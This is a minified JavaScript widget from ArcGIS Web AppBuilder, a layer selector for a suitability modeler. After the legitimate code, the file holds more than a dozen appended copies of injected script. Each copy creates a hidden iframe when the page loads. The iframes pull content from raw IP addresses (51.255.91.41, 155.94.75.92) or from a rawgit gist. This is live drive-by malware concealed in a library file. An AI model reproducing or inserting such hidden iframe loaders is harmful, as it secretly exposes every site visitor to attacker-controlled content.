// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/SuitabilityModeler/wro/templates/WeightedOverlayLayerSelector.html":'\x3cdiv class\x3d"${baseClass}"\x3e\r\n  \x3cspan class\x3d"btn-group pull-right"\x3e\r\n    \x3cspan class\x3d"icon-button" role\x3d"button"\r\n      data-dojo-attach-point\x3d"btnPreview"\r\n      \x3e\x3ci class\x3d"esri-icon-globe"\x3e\x3c/i\x3e\x3c/span\x3e\r\n    \x3cspan class\x3d"icon-button" role\x3d"button"\r\n      data-dojo-attach-point\x3d"btnInfo"\r\n      \x3e\x3ci class\x3d"esri-icon-description"\x3e\x3c/i\x3e\x3c/span\x3e\r\n  \x3c/span\x3e\r\n  \x3clabel\x3e\r\n    \x3cinput type\x3d"checkbox" name\x3d"wro-selected-layers"\r\n      data-dojo-type\x3d"dijit/form/CheckBox"\r\n      data-dojo-attach-point\x3d"chkModelLayer"/\x3e\r\n      \x3cspan data-dojo-attach-point\x3d"txtLabel"\x3e\x3c/span\x3e\r\n  \x3c/label\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/on dojo/Evented dojo/dom-class dojo/string dijit/registry dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dijit/_Container dijit/TooltipDialog dijit/popup esri/IdentityManager esri/request esri/layers/ArcGISImageServiceLayer ./containerUtils dojo/text!./templates/WeightedOverlayLayerSelector.html dijit/form/HorizontalSlider dijit/form/CheckBox".split(" "),function(k,q,f,e,l,g,m,n,p,r,t,u,v,h,w,x,y,z,A,B){var C=
k([p,r,t,l],{context:null,i18n:null,templateString:A,baseClass:"weighted-overlay-layer-selector",_parentWgt:null,_setRasterLayerAttr:function(a){this.chkModelLayer.set("value",a.id.toString());this.chkModelLayer.set("title",a.title);this.txtLabel.innerHTML=a.title},_setTooltipDialogAttr:function(a){var b=this;this.tooltipDialog=a;this.own(e(a,"MouseLeave",function(){h.close(b.tooltipDialog)}))},postCreate:function(){var a=this,b=this.chkModelLayer,c=this.btnInfo;this.txtLabel.setAttribute("for",b.id);
this.showPreview&&this.rasterLayer.url?this.own(e(this.btnPreview,"click",function(){a.emit("PreviewClick",a.rasterLayer.url,a.btnPreview)})):(this.btnPreview.style||(this.btnPreview.style={}),this.btnPreview.style.display="none");this.showInfo&&this.rasterLayer.url||this.showInfo&&this.rasterLayer.metadata?this.own(e(c,"click",function(){a.showInfoTooltip()})):this.btnInfo.style.display="none";this.own(e(b,"change",function(){a._parentWgt._onContainerNodeChange({target:b.focusNode})}))},showInfoTooltip:function(){var a=
this.rasterLayer.metadata;a&&(0<=a.indexOf("https")||0<=a.indexOf("http")||(a=null));var b=this;a?b._showInfoTooltip(b.rasterLayer.title,b.rasterLayer.metadata):this.rasterLayer.url?x({url:this.rasterLayer.url+"/info/iteminfo",content:{f:"json"},handleAs:"json",callbackParamName:"callback"}).then(function(a){b.rasterLayer.infoText=a.snippet||a.summary||a.description;b._showInfoTooltip(b.rasterLayer.infoText,b.rasterLayer.url)}):this.context.showMessage(this.i18n.wro.caption,this.i18n.wro.validation.invalidLink)},
_showInfoTooltip:function(a,b){var c;this.tooltipDialog&&(h.close(this.tooltipDialog),(c=w.findCredential(b))&&c.token&&(b+=(-1<b.indexOf("?")?"\x26":"?")+"token\x3d"+c.token),a+=" \x3ca href\x3d"+b+" target\x3d'_blank'\x3e"+this.i18n.wro.readMore+"\x3c/a\x3e",this.tooltipDialog.set("content",a),h.open({popup:this.tooltipDialog,around:this.btnInfo,orient:["before-centered","before"]}))},setSelected:function(a){this.chkModelLayer.set("checked",a)}});return k([p,u,l],{context:null,i18n:null,showPreview:!0,
showInfo:!0,_setWeightedOverlayServiceAttr:function(a){this.setWeightedOverlayService(a)},_setModelAttr:function(a){this.setModel(a)},buildRendering:function(){this.inherited(arguments);var a=document.createElement("div");a.className="transparency-container";var b=this.domNode;this.parent&&this.parent.selectLayersViewHeader&&(b=this.parent.selectLayersViewHeader);b.appendChild(a);this.previewSlider=new B({minimum:0,maximum:1,value:.2,intermediateChanges:!0,showButtons:!1,"class":"modeler-transparency-slider slider-primary"});
this.previewSlider.placeAt(a,"last");this.containerNode=document.createElement("div");this.containerNode.setAttribute("class","modeler-scroll-panel");this.domNode.appendChild(this.containerNode);this.tooltipDialog=new v({style:"width: 300px;"})},postCreate:function(){var a=this;this.own(e(this.previewSlider,"change",function(){a.updatePreviewOpacity()}))},_onContainerNodeChange:function(a){var b=a.target,c;if("checkbox"===b.type){c=this._getLayerIdFromCheckbox(b);if(b.checked){b=this.getOverlayLayer(c);
try{this.addOverlayLayer(b||{id:c,weight:0})}catch(d){(a=n.byId(a.target.id))&&a.set("checked",!1),this._showError(d)}}else this.removeOverlayLayer(c);this.emit("selection-changed")}},_getLayerIdFromCheckbox:function(a){var b;try{b=parseInt(a.value,10)}catch(c){b=a.value}return b},_showError:function(a){this.context.showError(this.i18n.wro.caption,a)},setWeightedOverlayService:function(a){this.weightedOverlayService=a;this._initLayerSelectors(this.weightedOverlayService.rasterLayers)},_initLayerSelectors:function(a){var b=
this;z.removeChildren(this);f.forEach(a,function(a){var c=this.getOverlayLayer(a.id);a=new C({context:b.context,i18n:b.i18n,rasterLayer:a,tooltipDialog:this.tooltipDialog,showPreview:this.showPreview,showInfo:this.showInfo,_parentWgt:b});a.setSelected(c?!0:!1);a.startup();this.own(e(a,"PreviewClick",function(a,c){b._OnPreviewClick(a,c)}));this.addChild(a)},this)},setModel:function(a){this.model=a;a=this.containerNode.querySelectorAll('input[name\x3d"wro-selected-layers"]');f.forEach(a,function(a){var b=
this._getLayerIdFromCheckbox(a);a=n.byId(a.id);var d=f.some(this.model.overlayLayers,function(a){return a.id===b});a.set("checked",d)},this)},_OnPreviewClick:function(a,b){a&&(this._selectedPreviewNode&&this._previewLayer&&this._previewLayer.url===a?this.hidePreviewLayer():(this.hidePreviewLayer(),this._setPreviewLayer(a),this._selectedPreviewNode&&g.remove(this._selectedPreviewNode,"checked"),this._selectedPreviewNode=b,g.add(this._selectedPreviewNode,"checked")))},hidePreviewLayer:function(){if(this._previewLayer)if(this._previewLayer._map)try{this._previewLayer._map.removeLayer(this._previewLayer),
this._previewLayer=null}catch(a){console.warn("Error removing wro preview layer"),console.error(a)}else this._previewLayer.hide();this._selectedPreviewNode&&(g.remove(this._selectedPreviewNode,"checked"),this._selectedPreviewNode=null)},_setPreviewLayer:function(a){var b=q.mixin({id:this.context.generateRandomId()},this.previewLayerOptions),c=this.map||this.context.getMap()||this.weightedOverlayService.imageServiceLayer.getMap();if(c){a:{var d=c.getLayer(b.id);if(d){if(d.url===a){c=d;break a}c.removeLayer(d)}a=
new y(a,b);c=c.addLayer(a)}this._previewLayer=c;this.updatePreviewOpacity();this._previewLayer.show()}},updatePreviewOpacity:function(){this._previewLayer&&this._previewLayer.setOpacity(1-this.previewSlider.value)},showPreviewLayer:function(){this._previewLayer&&this._previewLayer.show()},addOverlayLayer:function(a){var b;if(this.weightedOverlayService)if(b=this.weightedOverlayService.rastersInFunction,this.model.overlayLayers.length<b||!b)if(b=this.weightedOverlayService.getRasterLayer(a.id))a.name=
b.name,a.url=b.url,a.title=b.title,a.remapRanges||(a.remapRanges=b.remapRanges),this.removeOverlayLayer(a.id),this.model.overlayLayers.push(a);else throw m.substitute(this.i18n.wro.validation.notFound,[a.id]);else throw m.substitute(this.i18n.wro.validation.maxLayers,[b]);else throw this.i18n.wro.validation.wroServiceNotDefined;},getOverlayLayer:function(a){var b;this.model&&this.model.overlayLayers&&f.some(this.model.overlayLayers,function(c){if(c.id===a)return b=c,!1});return b},removeOverlayLayer:function(a){for(var b=
this.model.overlayLayers,c=b.length,d=0;d<c;d++)if(b[d].id===a){b.splice(d,1);break}}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});